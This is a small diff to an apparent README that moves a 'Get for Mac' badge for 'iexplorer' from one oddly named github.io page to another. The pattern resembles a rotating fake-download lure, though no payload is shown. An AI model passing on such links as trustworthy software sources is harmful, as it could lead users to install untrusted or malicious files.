@@ -5,7 +5,7 @@
 <br>
 <div align="center">
 
-[![Get for Mac](https://img.shields.io/badge/Get_for_Mac-green?style=for-the-badge&logo=apple)](https://pregabalin-apps.github.io/.github/iexplorer)
+[![Get for Mac](https://img.shields.io/badge/Get_for_Mac-green?style=for-the-badge&logo=apple)](https://sanpedro-apps.github.io/.github/iexplorer)
 
 </div>
 
